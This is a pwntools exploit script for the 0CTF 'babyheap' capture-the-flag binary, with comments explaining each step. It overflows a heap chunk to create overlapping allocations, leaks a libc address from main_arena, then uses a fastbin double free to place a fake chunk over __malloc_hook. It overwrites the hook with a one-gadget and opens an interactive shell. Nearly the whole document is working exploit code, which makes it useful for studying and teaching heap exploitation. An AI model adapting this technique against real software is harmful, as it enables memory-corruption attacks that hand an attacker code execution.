# Import pwntools
from pwn import *

# First establish the target process and libc file
# The ld_preload is used to switch out the libc version we are using
target = process('./0ctfbabyheap', env={"LD_PRELOAD": "./libc-2.23.so"})
# gdb.attach(target)
elf = ELF('libc-2.23.so')

# Establish the functions to interact with the program


def alloc(size):
    target.recvuntil("Command: ")
    target.sendline("1")
    target.recvuntil("Size: ")
    target.sendline(str(size))


def fill(index, size, content):
    target.recvuntil("Command: ")
    target.sendline("2")
    target.recvuntil("Index: ")
    target.sendline(str(index))
    target.recvuntil("Size: ")
    target.sendline(str(size))
    target.recvuntil("Content: ")
    target.send(content)


def free(index):
    target.recvuntil("Command: ")
    target.sendline("3")
    target.recvuntil("Index: ")
    target.sendline(str(index))


def dump(index):
    target.recvuntil("Command")
    target.sendline("4")
    target.recvuntil("Index: ")
    target.sendline(str(index))
    target.recvuntil("Content: \n")
    content = target.recvline()
    return content


# Make the initial four allocations, and fill them with data
alloc(0xf0)  # Chunk 0
alloc(0x70)  # Chunk 1
alloc(0xf0)  # Chunk 2
alloc(0x30)  # Chunk 3
fill(0, 0xf0, b"0"*0xf0)
fill(1, 0x70, b"1"*0x70)
fill(2, 0xf0, b"2"*0xf0)
fill(3, 0x30, b"3"*0x30)

# Free the first two
free(0)  # Chunk 0
free(1)  # Chunk 1

# Allocate new space where chunk 1 used to be, and overflow chunk chunk 2's previous size with 0x180 and the previous in use bit with 0x0 by pushing 0x100
alloc(0x78)  # Chunk 0
fill(0, 128, b'4'*0x70 + p64(0x180) + p64(0x100))

# Free the second chunk, which will bring the edge of the heap before the new chunk 0, thus effictively forgetting about Chunk 0
free(2)

# Allocate a new chunk that will move the libc address for main_arena+88 into the content
alloc(0xf0)  # Chunk 1
fill(1, 0xf0, b'5'*0xf0)
# Print the contents of chunk 0, and filter out the main_arena+88 infoleak, and calculate the offsets for everything else
leak = u64(dump(0)[0:8])
libc = leak - elf.symbols['__malloc_hook'] - 0x68
system = libc + 0x4526a
malloc_hook = libc + elf.symbols['__malloc_hook']
free_hook = libc + elf.symbols['__free_hook']
fake_chunk = malloc_hook - 0x23
log.info("Leak is:        " + hex(leak))
log.info("System is:      " + hex(system))
log.info("Free hook is:   " + hex(free_hook))
log.info("Malloc hook is: " + hex(malloc_hook))
log.info("Fake chunk is:  " + hex(fake_chunk))
log.info("libc is:        " + hex(libc))

# Free the first chunk to make room for the double free/fastbin duplicaion
free(1)

# Allocate the next four chunks, chunk 5 will directly overlap with chunk 0 and both chunks will have the same pointer
alloc(0x10)  # Chunk 1
alloc(0x60)  # Chunk 2
alloc(0x60)  # Chunk 4
alloc(0x60)  # Chunk 5

# Commence the double free by freeing 5 then 0, and 4 in between to stop a crash
free(5)
free(4)
free(0)

# Allocate 2 chunks, fill in the chunk that was freed twice with the fake chunk, allocate that chunk again to add the fake chunk to the free list
alloc(0x60)  # Chunk 4
alloc(0x60)  # Chunk 5
fill(0, 0x60, p64(fake_chunk) + p64(0) + b'y'*0x50)
alloc(0x60)  # Chunk 0

# Allocate the fake chunk, and write over the malloc hook with the One Shot Gadget
alloc(0x60)  # Chunk 6
fill(6, 0x1b, b'z'*0x13 + p64(system))

# Trigger a Malloc call to trigger the malloc hook, and pop a shell
target.sendline('1\n1\n')
target.recvuntil("Size: ")

# Drop to an interactive shell to use the shell
target.interactive()
